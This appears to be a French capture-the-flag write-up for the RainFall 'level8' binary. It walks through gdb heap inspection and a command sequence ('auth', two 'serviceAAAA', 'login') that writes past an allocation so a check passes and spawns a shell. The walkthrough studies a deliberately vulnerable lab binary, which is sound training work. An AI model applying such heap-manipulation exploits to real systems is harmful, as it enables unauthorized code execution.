# level8

On a un main de 450 instructions, on va devoir disas et simplifier en C pour y comprendre quelque chose (cf. source.c)

Donc on a un printf qui affiche deux adresses : auth, service
On a un `fgets(buf, 128, stdin)`

Ensuite il y a des `strncmp(buf, "auth"/"reset"/"service"/"login")`
Qui effectuent des operations differentes
Si on test d'envoyer auth a gets via stdin on remarque qu'il nous alloue un espace de 4 bytes 
```
0x804a008:      0x0000000a      0x00000000      0x00000000      0x00000011
0x804a018:      0x0000000a      0x00000000      0x00000000      0x00000011
```
Nos deux blocs finissent par \xa(10 en d) qui correspond a '\n' en ascii
La suite correspond a des métadonnées de gestion (header) et a un padding pour l'alignement mémoire

Ensuite on a "service" qui strdup a buf+7 (donc ce qui suit service)
Donc on peut en profiter pour ecrire des donnees en memoire en envoyant par exemple : `serviceAAAA`

Le strncmp avec login verifie si auth[32] != 0
Il va donc falloir ecrire en memoire a `*(auth + 32)` pour que le `system("/bin/sh")` soit execute

Avec service nous pouvons le faire.

Essayons avec gdb :

Mettons un break avant l'appel a fgets
`b *main+74`

Nous pouvons, a l'aide de `commands` executer des commandes a chaque break point, donc a chaque tour de boucle avec le while(1)
```
commands
x/32wx 0x804a008
continue
end
```
Je cherche a print les adresses sur la heap pour voir les differentes allocations qui sont faites

En envoyant "auth " au premier tour de boucle puis "serviceAAAA"
On arrive a ce resulat :
```
0x804a008:      0x0000000a      0x00000000      0x00000000      0x00000011
0x804a018:      0x41414141      0x0000000a      0x00000000      0x00020fe1
```
C'est un bon debut, il faut maintenant ecrire a `*(auth+32)`
On sait que chaque allocation decale la nouvelle adresse a +16
Donc on essaye d'envoyer deux fois serviceAAAA suivi de login 
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
serviceAAAA
0x804a008, 0x804a018 
serviceAAAA
0x804a008, 0x804a028 
login
```
auth+32 pointe bien vers notre bloc AAAA
la condition est true, system("/bin/sh") est execute